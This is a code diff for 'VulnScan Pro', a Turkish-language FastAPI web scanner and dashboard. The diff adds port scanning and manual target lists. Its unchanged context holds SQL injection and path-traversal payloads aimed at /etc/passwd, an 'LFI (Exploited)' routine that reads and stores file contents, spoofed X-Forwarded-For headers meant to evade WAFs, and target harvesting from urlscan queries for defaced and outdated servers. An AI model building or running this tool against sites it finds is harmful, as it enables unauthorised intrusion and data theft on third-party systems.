@@ -11,7 +11,6 @@ import time
 import random
 import re
 import base64
-import socket
 from typing import List
 import uvicorn
 
@@ -19,7 +18,7 @@ import uvicorn
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
 logger = logging.getLogger("VulnScan")
 
-app = FastAPI(title="VulnScan Pro - Ultimate Engine")
+app = FastAPI(title="VulnScan Pro - Ultimate Deep Scan")
 
 # --- VERİTABANI VE DİZİN AYARLARI ---
 DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
@@ -87,14 +86,17 @@ ws_handler = WSHandler()
 ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
 logger.addHandler(ws_handler)
 
-# --- ZAFİYET LİSTELERİ ---
+# --- ZAFİYET VE PAYLOAD LİSTELERİ ---
 COMMON_DIRS = [
     "/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php", 
-    "/.git/HEAD", "/.svn/entries", "/backup.sql", "/db.sql", "/docker-compose.yml"
+    "/.git/config", "/.svn/entries", "/backup.sql", "/db.sql", "/docker-compose.yml"
 ]
+COMMON_PORTS = [21, 22, 80, 443, 3306, 8080, 8443]
+
 SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
 TIME_SQLI_PAYLOADS = ["1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--"]
 SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark"]
+
 LFI_PAYLOADS = [
     "../../../../etc/passwd", 
     "..\\..\\..\\..\\windows\\win.ini",
@@ -112,6 +114,18 @@ async def save_finding(url, vuln, payload, data):
                          VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
             conn.commit()
     await asyncio.to_thread(db_insert)
+
+# --- PORT TARAMA ---
+async def scan_ports(ip, results):
+    for port in COMMON_PORTS:
+        try:
+            fut = asyncio.open_connection(ip, port)
+            reader, writer = await asyncio.wait_for(fut, timeout=2)
+            writer.close()
+            await writer.wait_closed()
+            results.append({"type": "Port", "detail": f"Açık Port: {port}", "evidence": "TCP Bağlantısı Başarılı"})
+        except:
+            pass
 
 # --- ALT ALAN ADI KEŞFİ (crt.sh) ---
 async def fetch_subdomains(session, domain):
@@ -139,8 +153,7 @@ async def scan_and_exploit(session, target_url, config):
     # WAF ve IP Atlatma Başlıkları
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
-        "X-Originating-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
     }
     
     try:
@@ -150,12 +163,20 @@ async def scan_and_exploit(session, target_url, config):
                 await manager.broadcast({"type": "scan_result", "data": report})
                 return
 
-            # WAF ve CORS Tespiti
             res_headers = response.headers
             if "cloudflare" in res_headers.get("Server", "").lower() or "cf-ray" in res_headers:
                 report["waf"] = True
+                
+            # CORS Kontrolü
             if res_headers.get("Access-Control-Allow-Origin") == "*":
-                report["vulns"].append({"type": "CORS Misconfig", "detail": "Wildcard (*) Origin", "evidence": "Cross-Origin Leak"})
+                report["vulns"].append({"type": "CORS Misconfig", "detail": "Wildcard (*)", "evidence": "Cross-Origin Leak"})
+
+            parsed_url = urllib.parse.urlparse(target_url)
+            ip = parsed_url.hostname
+
+            # Port Taraması
+            if config.get("ports"):
+                await scan_ports(ip, report["vulns"])
 
             # Dizin ve Admin Panel Taraması
             if config.get("dirs"):
@@ -166,7 +187,7 @@ async def scan_and_exploit(session, target_url, config):
                             if res.status == 200:
                                 size = res.headers.get('Content-Length', '0')
                                 if path.endswith('.sql') and int(size) > 1000000:
-                                    report["vulns"].append({"type": "Kritik Veri Sızıntısı", "payload": path, "evidence": f"Büyük SQL Dosyası: {size} bytes"})
+                                    report["vulns"].append({"type": "Kritik Veri", "payload": path, "evidence": f"Büyük SQL: {size} bytes"})
                                 elif "admin" in path or "login" in path:
                                     report["vulns"].append({"type": "Admin Panel", "payload": path, "evidence": "HTTP 200 OK"})
                                 else:
@@ -204,8 +225,7 @@ async def scan_and_exploit(session, target_url, config):
                                     exploit_evidence = decoded[:50].replace('\n', ' ') + "..."
                                     report["vulns"].append({"type": "LFI (Exploited)", "payload": payload, "evidence": exploit_evidence})
                                     await save_finding(target_url, "LFI Exploit", payload, exploit_evidence)
-                                except:
-                                    pass
+                                except: pass
                                 break
                     except: pass
 
@@ -222,8 +242,9 @@ async def run_scan_pipeline(config: dict):
     limit = config.get("limit", 50)
     threads = config.get("threads", 50)
     subdomain = config.get("subdomain", "")
+    manual_urls = config.get("manual_urls", "")
     
-    logger.info(f"Tarama Başlatıldı. Limit: {limit} | Threads: {threads}")
+    logger.info(f"Derin Tarama Başlatıldı. Limit: {limit} | Threads: {threads}")
     
     connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
     timeout = aiohttp.ClientTimeout(total=15)
@@ -231,11 +252,22 @@ async def run_scan_pipeline(config: dict):
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         targets = set()
         
-        if subdomain:
+        # Manuel URL Ekleme
+        if manual_urls:
+            for url in manual_urls.split('\n'):
+                url = url.strip()
+                if url:
+                    if not url.startswith("http"): url = "http://" + url
+                    targets.add(url)
+            logger.info(f"{len(targets)} manuel hedef eklendi.")
+            
+        # Alt Alan Adı Keşfi
+        if subdomain and len(targets) < limit:
             subs = await fetch_subdomains(session, subdomain)
             targets.update(subs)
             logger.info(f"{len(subs)} alt alan adı bulundu.")
             
+        # OSINT (URLScan)
         if len(targets) < limit:
             try:
                 queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"']
@@ -268,13 +300,15 @@ async def run_scan_pipeline(config: dict):
         tasks = [limited_scan(url) for url in targets]
         await asyncio.gather(*tasks)
         
-    logger.info("Tarama Tamamlandı.")
+    logger.info("Derin Tarama Tamamlandı.")
 
 # --- API ENDPOINT'LERİ ---
 class ScanConfig(BaseModel):
     limit: int
     threads: int
     subdomain: str
+    manual_urls: str
+    ports: bool
     dirs: bool
     sqli: bool
     lfi: bool
@@ -310,150 +344,181 @@ def read_root():
     <html lang="tr">
     <head>
         <meta charset="UTF-8">
-        <title>VulnScan Pro | Ultimate Engine</title>
+        <title>VulnScan Pro | Ultimate Deep Scan</title>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
         <style>
             :root {
-                --bg: #090a0f; --panel: #12141c; --border: #1f2330;
-                --text: #e2e8f0; --accent: #6366f1; --danger: #ef4444;
+                --bg: #06080a; --panel: #11141a; --border: #1f2430;
+                --text: #e2e8f0; --accent: #3b82f6; --danger: #ef4444;
                 --warning: #f59e0b; --success: #10b981;
             }
             * { box-sizing: border-box; margin: 0; padding: 0; }
-            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; overflow: hidden; }
+            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
             
-            .sidebar { width: 340px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-            .brand { padding: 20px; border-bottom: 1px solid var(--border); }
-            .brand h1 { font-size: 1.2rem; font-weight: 800; color: #fff; }
-            .brand p { font-size: 0.75rem; color: var(--accent); font-weight: 600; letter-spacing: 1px; }
+            /* Top Bar (Header) */
+            .top-bar { background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; }
+            .logo h1 { font-size: 1.4rem; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
+            .logo span { font-size: 0.8rem; background: var(--accent); color: #fff; padding: 2px 8px; border-radius: 4px; }
             
-            .settings { padding: 20px; flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
-            .setting-group { display: flex; flex-direction: column; gap: 5px; }
-            .setting-group label { font-size: 0.8rem; color: #94a3b8; font-weight: 600; }
-            .setting-group input[type="number"], .setting-group input[type="text"] { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; }
-            
-            .checkbox-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 5px; }
-            .checkbox-group label { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: var(--text); cursor: pointer; background: var(--bg); padding: 8px; border: 1px solid var(--border); border-radius: 4px; }
-            .checkbox-group input { accent-color: var(--accent); }
-            
-            .btn-start { background: var(--accent); color: #fff; border: none; padding: 15px; border-radius: 6px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-            .btn-start:hover { background: #4f46e5; }
-            .btn-start:disabled { background: #334155; cursor: not-allowed; }
-            .btn-report { background: var(--success); color: #fff; border: none; padding: 10px; border-radius: 6px; font-weight: 600; font-size: 0.9rem; cursor: pointer; margin-top: 5px; text-align: center; text-decoration: none; display: block; }
+            .status-indicator { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: #94a3b8; }
+            .led { width: 10px; height: 10px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+            .led.connected { background: var(--success); box-shadow: 0 0 8px var(--success); }
 
-            .main-content { flex: 1; display: flex; flex-direction: column; }
-            .stats-bar { display: flex; background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; gap: 30px; }
+            /* Control Panel */
+            .control-panel { background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; display: flex; gap: 20px; align-items: flex-end; flex-wrap: wrap; }
+            .input-group { display: flex; flex-direction: column; gap: 5px; }
+            .input-group label { font-size: 0.75rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; }
+            .input-group input, .input-group textarea { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; outline: none; transition: 0.2s; }
+            .input-group input:focus, .input-group textarea:focus { border-color: var(--accent); }
+            .input-group textarea { height: 40px; resize: vertical; }
+            
+            .toggle-group { display: flex; gap: 10px; margin-bottom: 2px; }
+            .toggle-btn { background: var(--bg); border: 1px solid var(--border); color: #94a3b8; padding: 10px 15px; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: 0.2s; user-select: none; }
+            .toggle-btn.active { background: rgba(59, 130, 246, 0.15); border-color: var(--accent); color: var(--accent); }
+            
+            .btn-start { background: var(--danger); color: #fff; border: none; padding: 10px 25px; border-radius: 6px; font-weight: 800; font-size: 0.95rem; cursor: pointer; transition: 0.2s; height: 42px; box-shadow: 0 0 15px rgba(239, 68, 68, 0.3); }
+            .btn-start:hover { background: #dc2626; box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
+            .btn-start:disabled { background: #334155; box-shadow: none; cursor: not-allowed; }
+            
+            .btn-report { background: transparent; border: 1px solid var(--success); color: var(--success); padding: 10px 15px; border-radius: 6px; font-weight: 600; font-size: 0.85rem; text-decoration: none; transition: 0.2s; height: 42px; display: flex; align-items: center; }
+            .btn-report:hover { background: rgba(16, 185, 129, 0.1); }
+
+            /* Stats Bar */
+            .stats-bar { display: flex; background: #0d1117; border-bottom: 1px solid var(--border); padding: 10px 25px; gap: 40px; }
             .stat-item { display: flex; flex-direction: column; }
-            .stat-label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; }
-            .stat-value { font-size: 1.4rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
+            .stat-label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+            .stat-value { font-size: 1.3rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
             .stat-value.scanned { color: var(--accent); }
             .stat-value.vuln { color: var(--danger); }
             .stat-value.clean { color: var(--success); }
             .stat-value.error { color: var(--warning); }
 
-            .content-layout { display: flex; flex: 1; overflow: hidden; }
+            /* Main Layout */
+            .main-layout { display: flex; flex: 1; overflow: hidden; }
             
-            .terminal-panel { width: 35%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-            .panel-header { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.8rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; display: flex; justify-content: space-between; }
-            .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
-            .log-line { margin-bottom: 4px; word-wrap: break-word; }
-            .log-time { color: #475569; }
+            /* Terminal (Logs) */
+            .terminal-panel { width: 40%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+            .panel-header { padding: 12px 20px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.75rem; color: #94a3b8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; }
+            .terminal { flex: 1; overflow-y: auto; padding: 15px 20px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
+            .log-line { margin-bottom: 6px; word-wrap: break-word; display: flex; gap: 10px; }
+            .log-time { color: #475569; min-width: 65px; }
             .log-info { color: var(--accent); }
             .log-warning { color: var(--warning); }
             .log-critical { color: var(--danger); font-weight: bold; }
 
-            .table-panel { width: 65%; display: flex; flex-direction: column; background: var(--bg); }
-            .table-container { flex: 1; overflow-y: auto; padding: 15px; }
-            table { width: 100%; border-collapse: collapse; }
-            th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
-            th { background: var(--panel); color: #94a3b8; font-weight: 600; position: sticky; top: 0; z-index: 10; }
-            tr:hover { background: #1e2230; }
+            /* Results Table */
+            .table-panel { width: 60%; display: flex; flex-direction: column; background: var(--bg); }
+            .table-tools { padding: 10px 20px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; gap: 15px; }
+            .table-tools input { flex: 1; background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 10px 15px; border-radius: 6px; font-size: 0.85rem; outline: none; transition: 0.2s; }
+            .table-tools input:focus { border-color: var(--accent); }
             
-            .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
+            .table-container { flex: 1; overflow-y: auto; padding: 20px; }
+            table { width: 100%; border-collapse: collapse; }
+            th, td { padding: 14px 20px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
+            th { background: #11141a; color: #94a3b8; font-weight: 600; position: sticky; top: 0; z-index: 10; }
+            tr:hover { background: #161b22; }
+            
+            .badge { padding: 4px 10px; border-radius: 4px; font-size: 0.7rem; font-weight: 700; letter-spacing: 0.5px; }
             .badge-vuln { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
             .badge-clean { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
             .badge-err { background: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
-            .badge-waf { background: rgba(139, 92, 246, 0.15); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); margin-left: 5px; }
+            .badge-waf { background: rgba(139, 92, 246, 0.15); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); margin-left: 8px; }
             
             .vuln-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #fca5a5; display: block; margin-top: 4px; }
             .vuln-detail span { color: #fff; }
         </style>
     </head>
     <body>
-        <div class="sidebar">
-            <div class="brand">
-                <h1>VulnScan Pro</h1>
-                <p>ULTIMATE ENGINE v3.1</p>
+        <!-- Top Bar -->
+        <div class="top-bar">
+            <div class="logo">
+                <h1>VulnScan Pro <span>DEEP SCAN</span></h1>
             </div>
-            <div class="settings">
-                <div class="setting-group">
-                    <label>Hedef Domain (Alt Alan Adı Keşfi)</label>
-                    <input type="text" id="subdomain" placeholder="example.com">
-                </div>
-                <div class="setting-group">
-                    <label>Hedef Limiti</label>
-                    <input type="number" id="limit" value="100" min="10" max="1000">
-                </div>
-                <div class="setting-group">
-                    <label>Eşzamanlı İstek</label>
-                    <input type="number" id="threads" value="50" min="10" max="200">
-                </div>
-                
-                <div class="setting-group" style="margin-top: 10px;">
-                    <label>Tarama Modülleri</label>
-                    <div class="checkbox-group">
-                        <label><input type="checkbox" id="mod-dirs" checked> Dizin/Panel</label>
-                        <label><input type="checkbox" id="mod-sqli" checked> SQLi</label>
-                        <label><input type="checkbox" id="mod-lfi" checked> LFI</label>
-                        <label><input type="checkbox" id="mod-xss" checked> XSS</label>
-                    </div>
-                </div>
-
-                <button class="btn-start" id="startBtn" onclick="startScan()">TARAMAYI BAŞLAT</button>
-                <a href="/api/report" target="_blank" class="btn-report">JSON RAPORU İNDİR</a>
+            <div class="status-indicator">
+                <div class="led" id="ws-led"></div>
+                <span id="ws-status">Bağlantı Bekleniyor...</span>
             </div>
         </div>
 
-        <div class="main-content">
-            <div class="stats-bar">
-                <div class="stat-item">
-                    <span class="stat-label">Taranan</span>
-                    <span class="stat-value scanned" id="stat-scanned">0</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-label">Sızılan</span>
-                    <span class="stat-value vuln" id="stat-vuln">0</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-label">Temiz</span>
-                    <span class="stat-value clean" id="stat-clean">0</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-label">Hata</span>
-                    <span class="stat-value error" id="stat-error">0</span>
+        <!-- Control Panel -->
+        <div class="control-panel">
+            <div class="input-group">
+                <label>Hedef Domain (Subdomain)</label>
+                <input type="text" id="subdomain" placeholder="example.com">
+            </div>
+            <div class="input-group" style="flex: 1;">
+                <label>Manuel Hedefler (Alt Alta)</label>
+                <textarea id="manual_urls" placeholder="http://hedef1.com&#10;http://hedef2.com"></textarea>
+            </div>
+            <div class="input-group" style="width: 100px;">
+                <label>Limit</label>
+                <input type="number" id="limit" value="100" min="10" max="1000">
+            </div>
+            <div class="input-group" style="width: 100px;">
+                <label>Thread</label>
+                <input type="number" id="threads" value="50" min="10" max="200">
+            </div>
+            
+            <div class="input-group">
+                <label>Modüller</label>
+                <div class="toggle-group">
+                    <div class="toggle-btn active" id="mod-ports" onclick="toggleBtn(this)">Port</div>
+                    <div class="toggle-btn active" id="mod-dirs" onclick="toggleBtn(this)">Dizin</div>
+                    <div class="toggle-btn active" id="mod-sqli" onclick="toggleBtn(this)">SQLi</div>
+                    <div class="toggle-btn active" id="mod-lfi" onclick="toggleBtn(this)">LFI</div>
+                    <div class="toggle-btn active" id="mod-xss" onclick="toggleBtn(this)">XSS</div>
                 </div>
             </div>
 
-            <div class="content-layout">
-                <div class="terminal-panel">
-                    <div class="panel-header">Konsol Çıktısı</div>
-                    <div id="terminal" class="terminal"></div>
+            <button class="btn-start" id="startBtn" onclick="startScan()">TARAMAYI BAŞLAT</button>
+            <a href="/api/report" target="_blank" class="btn-report">JSON RAPOR</a>
+        </div>
+
+        <!-- Stats Bar -->
+        <div class="stats-bar">
+            <div class="stat-item">
+                <span class="stat-label">Taranan Hedef</span>
+                <span class="stat-value scanned" id="stat-scanned">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Açık Bulunan</span>
+                <span class="stat-value vuln" id="stat-vuln">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Temiz Çıkan</span>
+                <span class="stat-value clean" id="stat-clean">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Hata / Yanıtsız</span>
+                <span class="stat-value error" id="stat-error">0</span>
+            </div>
+        </div>
+
+        <!-- Main Layout -->
+        <div class="main-layout">
+            <div class="terminal-panel">
+                <div class="panel-header">Sistem Konsolu</div>
+                <div id="terminal" class="terminal">
+                    <div class="log-line"><span class="log-time">[SİSTEM]</span><span class="log-info">Arayüz hazır. Tarama bekleniyor...</span></div>
                 </div>
-                
-                <div class="table-panel">
-                    <div class="panel-header">Tarama Sonuçları</div>
-                    <div class="table-container">
-                        <table id="resultsTable">
-                            <thead>
-                                <tr>
-                                    <th>Hedef URL</th>
-                                    <th>Durum</th>
-                                    <th>Detaylar</th>
-                                </tr>
-                            </thead>
-                            <tbody id="tableBody">
-                            </tbody>
-                        </table>
-                    </div>
+            </div>
+            
+            <div class="table-panel">
+                <div class="table-tools">
+                    <input type="text" id="searchBar" placeholder="URL veya Zafiyet Ara..." onkeyup="filterTable()">
+                </div>
+                <div class="table-container">
+                    <table id="resultsTable">
+                        <thead>
+                            <tr>
+                                <th>Hedef URL</th>
+                                <th>Durum</th>
+                                <th>Zafiyet Detayları</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tableBody">
+                        </tbody>
+                    </table>
                 </div>
             </div>
         </div>
@@ -463,8 +528,20 @@ def read_root():
             const ws = new WebSocket(protocol + window.location.host + "/ws");
             const terminal = document.getElementById('terminal');
             const tableBody = document.getElementById('tableBody');
+            const wsLed = document.getElementById('ws-led');
+            const wsStatus = document.getElementById('ws-status');
             
             let stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
+
+            ws.onopen = function() {
+                wsLed.classList.add('connected');
+                wsStatus.innerText = "Bağlantı Aktif";
+            };
+
+            ws.onclose = function() {
+                wsLed.classList.remove('connected');
+                wsStatus.innerText = "Bağlantı Koptu";
+            };
 
             ws.onmessage = function(event) {
                 const data = JSON.parse(event.data);
@@ -476,7 +553,7 @@ def read_root():
                     if (data.level === "WARNING") colorClass = "log-warning";
                     if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";
 
-                    line.innerHTML = `<span class="log-time">[${data.time}]</span> <span class="${colorClass}">${data.message}</span>`;
+                    line.innerHTML = `<span class="log-time">[${data.time}]</span><span class="${colorClass}">${data.message}</span>`;
                     terminal.appendChild(line);
                     terminal.scrollTop = terminal.scrollHeight;
                 } 
@@ -486,25 +563,25 @@ def read_root():
                     const res = data.data;
                     let statusBadge = "";
                     let detailHtml = "";
+                    let rowClass = "";
                     
                     if (res.status === "SIZILDI") {
                         stats.vuln++;
-                        statusBadge = `<span class="badge badge-vuln">SIZILDI</span>`;
-                        res.vulns.forEach(v => {
-                            detailHtml += `<span class="vuln-detail">> <span>${v.type}</span>: ${v.payload || v.detail} (${v.evidence})</span>`;
-                        });
+                        statusBadge = `<span class="badge badge-vuln">AÇIK</span>`;
+                        detailHtml = res.vulns.map(v => `<span class="vuln-detail">> <span>${v.type}</span>: ${v.payload || v.detail}</span>`).join('');
+                        rowClass = "vuln-row";
                     } else if (res.status === "ERROR" || res.status.startsWith("HTTP")) {
                         stats.error++;
                         statusBadge = `<span class="badge badge-err">${res.status}</span>`;
-                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Erişilemedi veya yanıt vermedi.</span>`;
+                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Yanıt yok.</span>`;
                     } else {
                         stats.clean++;
                         statusBadge = `<span class="badge badge-clean">TEMİZ</span>`;
-                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Zafiyet bulunamadı.</span>`;
+                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Zafiyet yok.</span>`;
                     }
 
                     if (res.waf) {
-                        statusBadge += `<span class="badge badge-waf">WAF VAR</span>`;
+                        statusBadge += `<span class="badge badge-waf">WAF</span>`;
                     }
 
                     document.getElementById('stat-scanned').innerText = stats.scanned;
@@ -513,6 +590,9 @@ def read_root():
                     document.getElementById('stat-error').innerText = stats.error;
 
                     const tr = document.createElement("tr");
+                    tr.className = rowClass;
+                    tr.setAttribute('data-search', (res.target + " " + res.status).toLowerCase());
+                    
                     tr.innerHTML = `
                         <td style="font-family:'JetBrains Mono', monospace; word-break:break-all;">${res.target}</td>
                         <td>${statusBadge}</td>
@@ -522,6 +602,25 @@ def read_root():
                     tableBody.insertBefore(tr, tableBody.firstChild);
                 }
             };
+
+            function toggleBtn(btn) {
+                btn.classList.toggle('active');
+            }
+
+            function filterTable() {
+                const input = document.getElementById("searchBar");
+                const filter = input.value.toLowerCase();
+                const trs = document.getElementById("resultsTable").querySelectorAll("tbody tr");
+
+                trs.forEach(tr => {
+                    const searchData = tr.getAttribute('data-search');
+                    if (searchData && searchData.includes(filter)) {
+                        tr.style.display = "";
+                    } else {
+                        tr.style.display = "none";
+                    }
+                });
+            }
 
             async function startScan() {
                 const btn = document.getElementById('startBtn');
@@ -540,10 +639,12 @@ def read_root():
                     limit: parseInt(document.getElementById('limit').value),
                     threads: parseInt(document.getElementById('threads').value),
                     subdomain: document.getElementById('subdomain').value.trim(),
-                    dirs: document.getElementById('mod-dirs').checked,
-                    sqli: document.getElementById('mod-sqli').checked,
-                    lfi: document.getElementById('mod-lfi').checked,
-                    xss: document.getElementById('mod-xss').checked
+                    manual_urls: document.getElementById('manual_urls').value.trim(),
+                    ports: document.getElementById('mod-ports').classList.contains('active'),
+                    dirs: document.getElementById('mod-dirs').classList.contains('active'),
+                    sqli: document.getElementById('mod-sqli').classList.contains('active'),
+                    lfi: document.getElementById('mod-lfi').classList.contains('active'),
+                    xss: document.getElementById('mod-xss').classList.contains('active')
                 };
 
                 try {
